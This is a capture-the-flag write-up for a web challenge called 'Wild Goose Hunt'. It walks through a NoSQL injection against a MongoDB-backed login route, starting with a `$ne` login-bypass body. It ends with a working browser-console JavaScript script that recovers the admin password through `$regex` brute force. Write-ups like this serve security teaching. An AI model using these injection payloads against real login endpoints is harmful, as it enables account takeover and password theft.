# Web - Wild Goose Hunt
This challenge was NoSQL injection through type confusion. If you're confused as to how this works I highly recommend the video [ippsec - Mango](https://youtu.be/NO_lsfhQK_s?t=531). 

The page has a simple login page with a username and password input. The `entrypoint.sh` file in the downloadable portion shows the flag is in the admin password field:
```bash
#!/bin/ash

# Secure entrypoint
chmod 600 /entrypoint.sh
mkdir /tmp/mongodb
mongod --noauth --dbpath /tmp/mongodb/ &
sleep 2
mongo heros --eval "db.createCollection('users')"
mongo heros --eval 'db.users.insert( { username: "admin", password: "CHTB{f4k3_fl4g_f0r_t3st1ng}"} )'
/usr/bin/supervisord -c /etc/supervisord.conf
```

We can also see that login function is vulnerable to NoSQL injection to the mongoDB database:
```js
router.post('/api/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return User.find({ 
			username,
			password
		})
			.then((user) => {
				if (user.length == 1) {
					return res.json({logged: 1, message: `Login Successful, welcome back ${user[0].username}.` });
				} else {
					return res.json({logged: 0, message: 'Login Failed'});
				}
			})
			.catch(() => res.json({ message: 'Something went wrong'}));
	}
	return res.json({ message: 'Invalid username or password'});
});
```
We can login to the app by sending the following body to the login function: `{ username: { $ne: "" }, password: { $ne: "" } }` which is just `username != "" && password != ""`. To get the flag, we need to get the admin's password, which we can do by bruteforcing the password using `$regex`. `{ username: "admin", password: { $regex: "a.*" } }` means "any password that starts with a". If this is successful, we know that the password starts with a so we move on to `aa.*`, otherwise we increment to b and so on until we have the entire flag.

Here is an exploit script in JS that can be run in your browser's console:
```js
// https://stackoverflow.com/a/6969486/9196137
function escapeRegExp(string) {
  return string.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); // $& means the whole matched string
}

async function isValid(pwd) {
  const r = await fetch("/api/login", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      username: { $ne: "" },
      password: { $regex: `^${escapeRegExp(pwd)}.*` },
    }),
  });
  if (r.status != 200) throw new Error(`bad status`);
  const data = await r.json();
  return !!data.logged;
}

async function brute() {
  const chars =
    "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ ";
  let i = 0;
  let good = "CHTB{";
  while (true) {
    let curr = chars[i];
    let att = good + curr;
    console.log(att);
    if (await isValid(att)) {
      good += curr;
      i = 0;
    } else {
      i++;
      if (i >= chars.length) {
        throw new Error("done or bad");
      }
    }
  }
}

brute();
```

